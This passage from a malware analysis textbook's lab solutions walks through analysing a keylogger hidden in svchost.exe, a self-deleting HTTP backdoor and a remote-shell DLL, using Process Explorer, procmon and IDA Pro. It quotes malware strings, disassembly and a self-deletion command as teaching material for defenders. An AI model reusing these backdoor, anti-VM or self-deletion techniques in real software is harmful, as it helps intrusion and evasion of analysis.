- en: (An *orphaned process* has no parent process listed in the process tree structure.)
    The fact that *svchost.exe* is orphaned is highly unusual and highly suspicious.
  prefs: []
  type: TYPE_NORMAL
- en: '**490**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 101](index-524_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 102](index-524_2.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 3-8L: Process Explorer view of orphaned* svchost.exe **3**'
  prefs: []
  type: TYPE_NORMAL
- en: We investigate further by right-clicking and selecting **Properties** for the
    orphaned *svchost.exe* process. As shown in Figure 3-8L, the process appears to
    be a valid *svchost.exe* process with PID 388, but this *svchost.exe* is suspicious
    because *svchost.exe* is typically a child of *services.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: From this same properties page, we select **Strings** to show the strings in
    both the executable image on disk and in memory. Toggling between the **Image**
    and **Memory** radio buttons shows significant discrepancies between the images.
    As shown in Figure 3-9L, the strings in memory on the right contain practicalmalwareanalysis.log
    and [ENTER], seen at  and , neither of which is found in a typical Windows *svchost.exe*
    file on disk, as seen on the left.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 3-9L: Process Explorer shows strings that are not normally contained
    in* svchost.exe *.*'
  prefs: []
  type: TYPE_NORMAL
- en: The presence of the string practicalmalwareanalysis.log, coupled with strings
    like [ENTER] and [CAPS LOCK], suggests that this program is a keylogger.
  prefs: []
  type: TYPE_NORMAL
- en: To test our assumption, we open Notepad and type a short message to see if the
    malware will perform keylogging. To do so, we use the PID (found in Process Explorer)
    for the orphaned *svchost.exe* to create a filter in procmon to show only events
    from that PID (388). As you can see in Figure 3-10L, the CreateFile and WriteFile
    events for *svchost.exe* are writing to the file named *practicalmalwareanalysis.log*.
    (This same string is visible in the memory view of the orphaned *svchost.exe*
    process.)
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**491**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 103](index-525_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 3-10L: Procmon output of svchost.exe with PID 388*'
  prefs: []
  type: TYPE_NORMAL
- en: Opening *practicalmalwareanalysis.log* with a simple text editor reveals the
    keystrokes you entered in Notepad. We conclude that this malware is a keylogger
    that uses process replacement on *svchost.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 3-4 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: When you run this malware by double-clicking it, the program immediately deletes
    itself.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: We suspect that we may need to provide a command-line argument or a missing
    component to the program.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: We try using the command-line parameters shown in the strings listing (like
    -in), but doing so is not fruitful. More in-depth analysis is required.
  prefs: []
  type: TYPE_NORMAL
- en: (We’ll analyze this malware further in the labs for Chapter 9.)
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin with basic static analysis, examining the PE file structure and strings.
    We see that this malware imports networking functionality, service-manipulation
    functions, and registry-manipulation functions. In the following listing, we notice
    a number of interesting strings.
  prefs: []
  type: TYPE_NORMAL
- en: SOFTWARE\Microsoft \XPS
  prefs: []
  type: TYPE_NORMAL
- en: \kernel32.dll
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.0
  prefs: []
  type: TYPE_NORMAL
- en: GET
  prefs: []
  type: TYPE_NORMAL
- en: NOTHING
  prefs: []
  type: TYPE_NORMAL
- en: DOWNLOAD
  prefs: []
  type: TYPE_NORMAL
- en: UPLOAD
  prefs: []
  type: TYPE_NORMAL
- en: SLEEP
  prefs: []
  type: TYPE_NORMAL
- en: cmd.exe
  prefs: []
  type: TYPE_NORMAL
- en: '>> NUL'
  prefs: []
  type: TYPE_NORMAL
- en: /c del
  prefs: []
  type: TYPE_NORMAL
- en: http://www.practicalmalwareanalysis.com
  prefs: []
  type: TYPE_NORMAL
- en: '**492**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 104](index-526_1.png)'
  prefs: []
  type: TYPE_IMG
- en: NT AUTHORITY\LocalService
  prefs: []
  type: TYPE_NORMAL
- en: Manager Service
  prefs: []
  type: TYPE_NORMAL
- en: .exe
  prefs: []
  type: TYPE_NORMAL
- en: '%SYSTEMROOT%\system32\'
  prefs: []
  type: TYPE_NORMAL
- en: k:%s h:%s p:%s per:%s
  prefs: []
  type: TYPE_NORMAL
- en: '**3**'
  prefs: []
  type: TYPE_NORMAL
- en: -cc
  prefs: []
  type: TYPE_NORMAL
- en: -re
  prefs: []
  type: TYPE_NORMAL
- en: -in
  prefs: []
  type: TYPE_NORMAL
- en: We see strings such as a domain name and the registry location SOFTWARE\ Microsoft
    \XPS. Strings like DOWNLOAD and UPLOAD, combined with the HTTP/1.0
  prefs: []
  type: TYPE_NORMAL
- en: string, suggest that this malware is an HTTP backdoor. The strings -cc, -re,
    and -in could be command-line parameters (for example -in may stand for install).
    Let’s see if basic dynamic techniques show us how these strings are used.
  prefs: []
  type: TYPE_NORMAL
- en: Before we run the malware, we run procmon and clear out all events, start Process
    Explorer, and set up a virtual network. When we run the malware, it appears to
    immediately delete itself, and we see nothing else of interest while watching
    with Process Explorer.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we use procmon with a filter on the process name *Lab03-04.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: There aren’t any interesting WriteFile or RegSetValue entries, but upon further
    digging, we find an entry for Process Create. Double-clicking this entry brings
    up the dialog shown in Figure 3-11L, and we see that the malware is deleting itself
    from the system using "C:\WINDOWS\system32\cmd.exe" /c del Z:\ Lab03-04.exe >>
    NUL, as seen at .
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 3-11L: Procmon view of the Process Create performed for self-deletion*
    We can try to run the malware from the command line using the command-line options
    we saw in the strings listing (-in, -re, and –cc), but all of them fail and result
    in the program deleting itself. There isn’t much more we can do with basic dynamic
    techniques at this point, until we dig deeper into the malware. (We will revisit
    this malware in the Chapter 9 labs.) Solutions to Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**493**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 5-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: DllMain is found at 0x1000D02E in the .text section.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The import for gethostbyname is found at 0x100163CC in the .idata section.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The gethostbyname import is called nine times by five different functions throughout
    the malware.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: A DNS request for pics.practicalmalwareanalysis.com will be made by the malware
    if the call to gethostbyname at 0x10001757 succeeds.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: IDA Pro has recognized 23 local variables for the function at 0x10001656\.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: IDA Pro has recognized one parameter for the function at 0x10001656\.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: The string \cmd.exe /c is located at 0x10095B34\.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: That area of code appears to be creating a remote shell session for the attacker.
  prefs: []
  type: TYPE_NORMAL
- en: 9\.
  prefs: []
  type: TYPE_NORMAL
- en: The OS version is stored in the global variable dword_1008E5C4\.
  prefs: []
  type: TYPE_NORMAL
- en: 10\. The registry values located at HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
    WorkTime and WorkTimes are queried and sent over the remote shell connection.
  prefs: []
  type: TYPE_NORMAL
- en: 11\. The PSLIST export sends a process listing across the network or finds a
    particular process name in the listing and gets information about it.
  prefs: []
  type: TYPE_NORMAL
- en: 12\. GetSystemDefaultLangID, send, and sprintf are API calls made from sub_10004E79\.
    This function could be renamed to something useful like GetSystemLanguage.
  prefs: []
  type: TYPE_NORMAL
- en: 13\. DllMain calls strncpy, strnicmp, CreateThread, and strlen directly. At
    a depth of 2, it calls a variety of API calls, including Sleep, WinExec, gethostbyname,
    and many other networking function calls.
  prefs: []
  type: TYPE_NORMAL
- en: 14\. The malware will sleep for 30 seconds.
  prefs: []
  type: TYPE_NORMAL
- en: 15\. The arguments are 6, 1, and 2\.
  prefs: []
  type: TYPE_NORMAL
- en: '16\. These arguments correspond to three symbolic constants: IPPROTO_TCP, SOCK_STREAM,
    and AF_INET.'
  prefs: []
  type: TYPE_NORMAL
- en: 17\. The in instruction is used for virtual machine detection at 0x100061DB,
    and the 0x564D5868h corresponds to the VMXh string. Using the cross-reference,
    we see the string Found Virtual Machine in the caller function.
  prefs: []
  type: TYPE_NORMAL
- en: 18\. Random data appears to exist at 0x1001D988\.
  prefs: []
  type: TYPE_NORMAL
- en: 19\. If you run *Lab05-01.py*, the random data is unobfuscated to reveal a string.
  prefs: []
  type: TYPE_NORMAL
- en: '20\. By pressing the A key on the keyboard, we can turn this into the readable
    string: xdoor is this backdoor, string decoded for Practical Malware Analysis
    Lab :)1234\.'
  prefs: []
  type: TYPE_NORMAL
- en: 21\. The script works by XOR’ing 0x50 bytes of data with 0x55 and modifying
    the bytes in IDA Pro using PatchByte.
  prefs: []
  type: TYPE_NORMAL
- en: '**494**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 105](index-528_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Once we load the malicious DLL into IDA Pro, we are taken directly to DllMain
    at 0x1000D02E. (You may need to display line numbers in the graph view by using
    **Options****General** and checking **Line Prefixes**, or you can toggle between
    the graph and traditional view by pressing the spacebar, which allows you to see
    the line numbers without changing the options.) DllMain is **5**
  prefs: []
  type: TYPE_NORMAL
- en: where we want to begin analysis, because all code that executes from the DllEntryPoint
    until DllMain has likely been generated by the compiler, and we don’t want to
    get bogged down analyzing compiler-generated code.
  prefs: []
  type: TYPE_NORMAL
- en: To answer questions 2 through 4, we begin by viewing the imports of this DLL,
    by selecting **View****Open Subviews****Imports**. In this list, we find gethostbyname
    and double-click it to see it in the disassembly. The gethostbyname import resides
    at location 0x100163CC in the .idata section of the binary.
  prefs: []
  type: TYPE_NORMAL
- en: To see the number of functions that call gethostbyname, we check its cross-references
    by pressing CTRL-X with the cursor on gethostbyname, which brings up the window
    shown in Figure 5-1L. The text “Line 1 of 18” at the bottom of the window tells
    us that there are nine cross-references for gethostbyname.
  prefs: []
  type: TYPE_NORMAL
- en: 'Some versions of IDA Pro double-count cross-references: p is a reference because
    it is being called, and r is a reference because it is a “read” reference (since
    it is call dword ptr [...] for an import, the CPU must read the import and then
    call into it). Examining the cross-reference list closely, you can see that gethostbyname
    is called by five separate functions.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 5-1L: Cross-references to gethostbyname*'
  prefs: []
  type: TYPE_NORMAL
- en: We press G on the keyboard to quickly navigate to 0x10001757\. Once at this
    location, we see the following code, which calls gethostbyname.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**495**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 106](index-529_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 1000174E mov eax, **off_10019040**
  prefs: []
  type: TYPE_NORMAL
- en: 10001753 add eax, 0Dh 
  prefs: []
  type: TYPE_NORMAL
- en: 10001756 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 10001757 call ds:**gethostbyname**
  prefs: []
  type: TYPE_NORMAL
- en: The gethostbyname method takes a single parameter—typically, a string containing
    a domain name. Therefore, we need to work backward and figure out what is in EAX
    when gethostbyname is called. It appears that off_10019040
  prefs: []
  type: TYPE_NORMAL
- en: is moved into EAX. If we double-click that offset, we see the string [This is
    RDO]pics.practicalmalwareanalysis.com at that location.
  prefs: []
  type: TYPE_NORMAL
- en: As you can see at , the pointer into the string is advanced by 0xD bytes, which
    gets a pointer to the string pics.practicalmalwareanalysis.com in EAX
  prefs: []
  type: TYPE_NORMAL
- en: for the call to gethostbyname. Figure 5-2L shows the string in memory, and how
    adding 0xD to EAX advances the pointer to the location of the URL in memory. The
    call will perform a DNS request to get an IP address for the domain.
  prefs: []
  type: TYPE_NORMAL
- en: EAX
  prefs: []
  type: TYPE_NORMAL
- en: EAX + 0xD
  prefs: []
  type: TYPE_NORMAL
- en: '**[**'
  prefs: []
  type: TYPE_NORMAL
- en: '**T**'
  prefs: []
  type: TYPE_NORMAL
- en: '**h**'
  prefs: []
  type: TYPE_NORMAL
- en: '**i**'
  prefs: []
  type: TYPE_NORMAL
- en: '**s**'
  prefs: []
  type: TYPE_NORMAL
- en: '**i**'
  prefs: []
  type: TYPE_NORMAL
- en: '**s**'
  prefs: []
  type: TYPE_NORMAL
- en: '**R D O**'
  prefs: []
  type: TYPE_NORMAL
- en: '**]**'
  prefs: []
  type: TYPE_NORMAL
- en: p
  prefs: []
  type: TYPE_NORMAL
- en: i
  prefs: []
  type: TYPE_NORMAL
- en: c
  prefs: []
  type: TYPE_NORMAL
- en: s
  prefs: []
  type: TYPE_NORMAL
- en: .
  prefs: []
  type: TYPE_NORMAL
- en: p
  prefs: []
  type: TYPE_NORMAL
- en: r
  prefs: []
  type: TYPE_NORMAL
- en: a
  prefs: []
  type: TYPE_NORMAL
- en: c
  prefs: []
  type: TYPE_NORMAL
- en: t
  prefs: []
  type: TYPE_NORMAL
- en: i
  prefs: []
  type: TYPE_NORMAL
- en: c
  prefs: []
  type: TYPE_NORMAL
- en: a
  prefs: []
  type: TYPE_NORMAL
- en: l
  prefs: []
  type: TYPE_NORMAL
- en: m a
  prefs: []
  type: TYPE_NORMAL
- en: l
  prefs: []
  type: TYPE_NORMAL
- en: w a
  prefs: []
  type: TYPE_NORMAL
- en: r
  prefs: []
  type: TYPE_NORMAL
- en: e
  prefs: []
  type: TYPE_NORMAL
- en: a
  prefs: []
  type: TYPE_NORMAL
- en: n a
  prefs: []
  type: TYPE_NORMAL
- en: l
  prefs: []
  type: TYPE_NORMAL
- en: y
  prefs: []
  type: TYPE_NORMAL
- en: s
  prefs: []
  type: TYPE_NORMAL
- en: i
  prefs: []
  type: TYPE_NORMAL
- en: s
  prefs: []
  type: TYPE_NORMAL
- en: .
  prefs: []
  type: TYPE_NORMAL
- en: c
  prefs: []
  type: TYPE_NORMAL
- en: o m
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 5-2L: Adjustment of the string pointer to access the URL*'
  prefs: []
  type: TYPE_NORMAL
- en: To answer questions 5 and 6,
  prefs: []
  type: TYPE_NORMAL
- en: we press G on the keyboard to navi-
  prefs: []
  type: TYPE_NORMAL
- en: gate to 0x10001656 in order to ana-
  prefs: []
  type: TYPE_NORMAL
- en: lyze sub_10001656\. In Figure 5-3L, we
  prefs: []
  type: TYPE_NORMAL
- en: see what IDA Pro has done to rec-
  prefs: []
  type: TYPE_NORMAL
- en: ognize and label the function’s
  prefs: []
  type: TYPE_NORMAL
- en: local variables and parameters. The
  prefs: []
  type: TYPE_NORMAL
- en: labeled local variables correspond
  prefs: []
  type: TYPE_NORMAL
- en: to negative offsets, and we count
  prefs: []
  type: TYPE_NORMAL
- en: 23 of them, most of which are pre-
  prefs: []
  type: TYPE_NORMAL
- en: pended with var_. The freeware ver-
  prefs: []
  type: TYPE_NORMAL
- en: sion of IDA Pro counts only 20 local
  prefs: []
  type: TYPE_NORMAL
- en: variables, so the version you are
  prefs: []
  type: TYPE_NORMAL
- en: using may detect a slightly different
  prefs: []
  type: TYPE_NORMAL
- en: number of local variables. The
  prefs: []
  type: TYPE_NORMAL
- en: parameters are labeled and refer-
  prefs: []
  type: TYPE_NORMAL
- en: enced with positive offsets, and we
  prefs: []
  type: TYPE_NORMAL
- en: see that IDA Pro has recognized
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 5-3L: IDA Pro function layout—*'
  prefs: []
  type: TYPE_NORMAL
- en: one parameter for the function
  prefs: []
  type: TYPE_NORMAL
- en: '*recognizing local variables and parameters*'
  prefs: []
  type: TYPE_NORMAL
- en: labeled arg_0\.
  prefs: []
  type: TYPE_NORMAL
- en: '**496**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: To answer questions 7 through 10, we begin by viewing the strings for this DLL
    by selecting **View****Open Subviews****Strings**. In this list, double-click
    \cmd.exe /c to see it in the disassembly. Notice that the string resides in the
    xdoors_d section of the PE file at 0x10095B34\. On checking the cross-references
    to this string, we see that there is only one at 0x100101D0, where this string
    is pushed onto the stack.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the graph view of this function shows a series of memcmp func-5
  prefs: []
  type: TYPE_NORMAL
- en: tions that are comparing strings such as cd, exit, install, inject, and uptime.
  prefs: []
  type: TYPE_NORMAL
- en: We also see that the string reference earlier in the function at 0x1001009D
  prefs: []
  type: TYPE_NORMAL
- en: contains the string This Remote Shell Session. Examining the function and the
    calls it makes shows a series of calls to recv and send. Using these three pieces
    of evidence, we can guess that we are looking at a remote shell session function.
  prefs: []
  type: TYPE_NORMAL
- en: The dword_1008E5C4 is a global variable that we can double-click (at 0x100101C8)
    to show its location in memory at 0x1008E5C4, within the
  prefs: []
  type: TYPE_NORMAL
- en: .data section of the DLL. Checking the cross-references by pressing CTRL**-**X
  prefs: []
  type: TYPE_NORMAL
- en: shows that it is referenced three times, but only one reference modifies dword_1008E5C4\.
    The following listing shows how dword_1008E5C4 is modified.
  prefs: []
  type: TYPE_NORMAL
- en: 10001673 call sub_10003695
  prefs: []
  type: TYPE_NORMAL
- en: 10001678 mov dword_1008E5C4, eax
  prefs: []
  type: TYPE_NORMAL
- en: We see that EAX is moved into dword_1008E5C4, and that EAX is the return value
    from the function call made in the previous instruction.
  prefs: []
  type: TYPE_NORMAL
- en: Therefore, we need to determine what that function returns. To do so, we examine
    sub_10003695 by double-clicking it and looking at the disassembly.
  prefs: []
  type: TYPE_NORMAL
- en: The sub_10003695 function contains a call to GetVersionEx, which obtains information
    about the current version of the OS, as shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: 100036AF call ds:**GetVersionExA**
  prefs: []
  type: TYPE_NORMAL
- en: 100036B5 xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 100036B7 cmp [ebp+VersionInformation.dwPlatformId], 2
  prefs: []
  type: TYPE_NORMAL
- en: 100036BE setz al
  prefs: []
  type: TYPE_NORMAL
- en: The dwPlatformId is compared to the number 2 in order to determine how to set
    the AL register. AL will be set if the PlatformId is VER_PLATFORM_WIN32_NT.
  prefs: []
  type: TYPE_NORMAL
- en: This is just a simple check to make sure that the OS is Windows 2000 or higher,
    and we can conclude that the global variable will typically be set to 1\.
  prefs: []
  type: TYPE_NORMAL
- en: 'As previously discussed, the remote shell function at 0x1000FF58 contains a
    series of memcmp functions starting at 0x1000FF58\. At 0x10010452, we see the
    memcmp with robotwork, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 10010444 push 9 ; Size
  prefs: []
  type: TYPE_NORMAL
- en: 10010446 lea eax, [ebp+Dst]
  prefs: []
  type: TYPE_NORMAL
- en: 1001044C push offset aRobotwork ; "robotwork"
  prefs: []
  type: TYPE_NORMAL
- en: 10010451 push eax ; Buf1
  prefs: []
  type: TYPE_NORMAL
- en: 10010452 call memcmp
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**497**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 107](index-531_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 10010457 add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 1001045A test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 1001045C jnz short loc_10010468 
  prefs: []
  type: TYPE_NORMAL
- en: 1001045E push [ebp+s]  ; s
  prefs: []
  type: TYPE_NORMAL
- en: 10010461 call sub_100052A2 
  prefs: []
  type: TYPE_NORMAL
- en: The jnz at  will not be taken if the string matches robotwork, and the call
    at  will be called. Examining sub_100052A2, we see that it queries the registry
    at HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WorkTime and WorkTimes, and
    then returns this information over the network socket that was passed to the function
    at .
  prefs: []
  type: TYPE_NORMAL
- en: To answer question 11, we begin by viewing the exports for this DLL
  prefs: []
  type: TYPE_NORMAL
- en: by selecting **View****Open Subviews****Exports**. We find PSLIST in this
    list and double-click it to move the cursor to 0x10007025, the start of the export’s
    code. This function appears to take one of two paths, depending on the result
    of sub_100036C3\. The sub_100036C3 function checks to see if the OS version is
    Windows Vista/7 or XP/2003/2000\. Both code paths use CreateToolhelp32Snapshot
    to help them grab a process listing, which we infer from the strings and API calls.
    Both code paths return the process listing over the socket using send.
  prefs: []
  type: TYPE_NORMAL
- en: To answer questions 12 and 13, we graph a function’s cross-references by selecting
    **View****Graphs****Xrefs From** when the cursor is on the function name of
    interest. We go to sub_10004E79 by pressing G on the keyboard and entering **0x10004E79**.
  prefs: []
  type: TYPE_NORMAL
- en: Figure 5-4L shows the result of graphing the cross-references for sub_10004E79\.
    We see that this function calls GetSystemDefaultLangID and send.
  prefs: []
  type: TYPE_NORMAL
- en: This information tells us that the function likely sends the language identifier
    over a network socket, so we can right-click the function name and give it a more
    meaningful name, such as send_languageID.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Performing a quick analysis like this is an easy way to get a high-level overview
    of a* *binary. This approach is particularly handy when analyzing large binaries.*'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 5-4L: Graph of cross-references from sub_10004E79*'
  prefs: []
  type: TYPE_NORMAL
- en: '**498**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 108](index-532_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 109](index-532_2.png)'
  prefs: []
  type: TYPE_IMG
- en: To determine how many Windows API
  prefs: []
  type: TYPE_NORMAL
- en: functions DllMain calls directly, we scroll
  prefs: []
  type: TYPE_NORMAL
- en: through the method and look for API calls,
  prefs: []
  type: TYPE_NORMAL
- en: or select **View****Graphs****Xrefs From** to open the dialog shown in Figure
    5-5L.
  prefs: []
  type: TYPE_NORMAL
- en: The start and end address should corre-
  prefs: []
  type: TYPE_NORMAL
- en: spond to the start of DllMain—specifically,
  prefs: []
  type: TYPE_NORMAL
- en: '**5**'
  prefs: []
  type: TYPE_NORMAL
- en: 0x1000D02E. Because we care only about the
  prefs: []
  type: TYPE_NORMAL
- en: cross-references *from* DllMain, we select a recursion depth of 1 to display
    only the functions
  prefs: []
  type: TYPE_NORMAL
- en: that DllMain calls directly. Figure 5-6L shows the
  prefs: []
  type: TYPE_NORMAL
- en: resulting graph. (The API calls are seen in
  prefs: []
  type: TYPE_NORMAL
- en: gray.) To see all functions called at a recursive
  prefs: []
  type: TYPE_NORMAL
- en: depth of 2, follow the same steps and select a
  prefs: []
  type: TYPE_NORMAL
- en: recursion depth of 2\. The result will be a much
  prefs: []
  type: TYPE_NORMAL
- en: larger graph, which even shows a recursive call
  prefs: []
  type: TYPE_NORMAL
- en: back to DllMain.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 5-5L: Dialog for setting*'
  prefs: []
  type: TYPE_NORMAL
- en: '*a custom cross-reference graph*'
  prefs: []
  type: TYPE_NORMAL
- en: '*from 0x1000D02E*'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 5-6L: Cross-reference graph for DllMain with a recursive depth of 1*'
  prefs: []
  type: TYPE_NORMAL
- en: As referenced in question 14, there is a call to Sleep at 0x10001358, as shown
    in the following listing. Sleep takes one parameter—the number of milliseconds
    to sleep—and we see it pushed on the stack as EAX.
  prefs: []
  type: TYPE_NORMAL
- en: 10001341 mov eax, **off_10019020**
  prefs: []
  type: TYPE_NORMAL
- en: 10001346 add eax, 0Dh
  prefs: []
  type: TYPE_NORMAL
- en: 10001349 push eax ; Str
  prefs: []
  type: TYPE_NORMAL
- en: 1000134A call ds:**atoi**
  prefs: []
  type: TYPE_NORMAL
- en: 10001350 imul eax, 3E8h
  prefs: []
  type: TYPE_NORMAL
- en: 10001356 pop ecx
  prefs: []
  type: TYPE_NORMAL
- en: 10001357 push eax ; dwMilliseconds
  prefs: []
  type: TYPE_NORMAL
- en: 10001358 call ds:**Sleep**
  prefs: []
  type: TYPE_NORMAL
- en: Working backward, it looks like EAX is multiplied by 0x3E8 (or 1000 in decimal),
    which tells us that the result of the call to atoi is multiplied by 1000
  prefs: []
  type: TYPE_NORMAL
- en: to get the number of seconds to sleep. Again working backward, we also see Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**499**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: that off_10019020 is moved into EAX. We can see what is at the offset by double-clicking
    it. This is a reference to the string [This is CTI]30\.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see that 0xD is added to the offset, which causes EAX to point to 30
    for the call to atoi, which will convert the string 30 into the number 30\.
  prefs: []
  type: TYPE_NORMAL
- en: Multiplying 30 by 1000, we get 30,000 milliseconds (30 seconds), and that is
    how long this program will sleep if the strings are the same upon execution.
  prefs: []
  type: TYPE_NORMAL
- en: As referenced in question 15, a call to socket at 0x10001701 is shown in the
    left column of Table 5-1L. We see that 6, 1, and 2 are pushed onto the stack.
    These numbers correspond to symbolic constants that are described on the MSDN
    page for socket. Right-clicking each of the numbers and selecting **Use Symbolic
    Constant** presents a dialog listing all of the constants that IDA Pro has for
    a particular value. In this example, the number 2 corresponds to AF_INET, which
    is used for setting up an IPv4 socket; 1 stands for SOCK_STREAM, and 6 stands
    for IPPROTO_TCP. Therefore, this socket will be configured for TCP over IPv4 (commonly
    used for HTTP).
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 5-1L:** Applying Symbolic Constants for a Call to socket **Before symbolic
    constants**'
  prefs: []
  type: TYPE_NORMAL
- en: '**After symbolic constants**'
  prefs: []
  type: TYPE_NORMAL
- en: 100016FB push 6
  prefs: []
  type: TYPE_NORMAL
- en: 100016FB push **IPPROTO_TCP**
  prefs: []
  type: TYPE_NORMAL
- en: 100016FD push 1
  prefs: []
  type: TYPE_NORMAL
- en: 100016FD push **SOCK_STREAM**
  prefs: []
  type: TYPE_NORMAL
- en: 100016FF push 2
  prefs: []
  type: TYPE_NORMAL
- en: 100016FF push **AF_INET**
  prefs: []
  type: TYPE_NORMAL
- en: 10001701 call ds:socket
  prefs: []
  type: TYPE_NORMAL
- en: 10001701 call ds:socket
  prefs: []
  type: TYPE_NORMAL
- en: 'To answer question 17, we search for the in instruction by selecting **Search****Text**
    and entering **in** (we could also select **Search****Sequence of** **Bytes**
    and searching for **ED**, the opcode for the in instruction). If we check **Find
    All Occurrences** in the search dialog, either option will present a new window
    listing all matches. Scrolling through the results shows only one instance of
    the in instruction at 0x100061DB, as follows: 100061C7 mov eax, **564D5868h ;
    "VMXh"**'
  prefs: []
  type: TYPE_NORMAL
- en: 100061CC mov ebx, 0
  prefs: []
  type: TYPE_NORMAL
- en: 100061D1 mov ecx, 0Ah
  prefs: []
  type: TYPE_NORMAL
- en: 100061D6 mov edx, 5658h
  prefs: []
  type: TYPE_NORMAL
- en: 100061DB **in** eax, dx
  prefs: []
  type: TYPE_NORMAL
- en: The mov instruction at 0x100061C7 moves 0x564D5868 into EAX. Right-clicking
    this value shows that it corresponds to the ASCII string VMXh, which confirms
    that this snippet of code is an anti-virtual machine technique being employed
    by the malware. (We discuss the specifics of this technique and others in Chapter
    17.) Checking the cross-references to the function that executes this technique
    offers further confirmation when we see Found Virtual Machine in the code after
    a comparison.
  prefs: []
  type: TYPE_NORMAL
- en: As referenced by question 18, we jump our cursor to 0x1001D988 using the G key.
    Here, we see what looks like random bytes of data and nothing readable. As suggested,
    we run the Python script provided by selecting **File**
  prefs: []
  type: TYPE_NORMAL
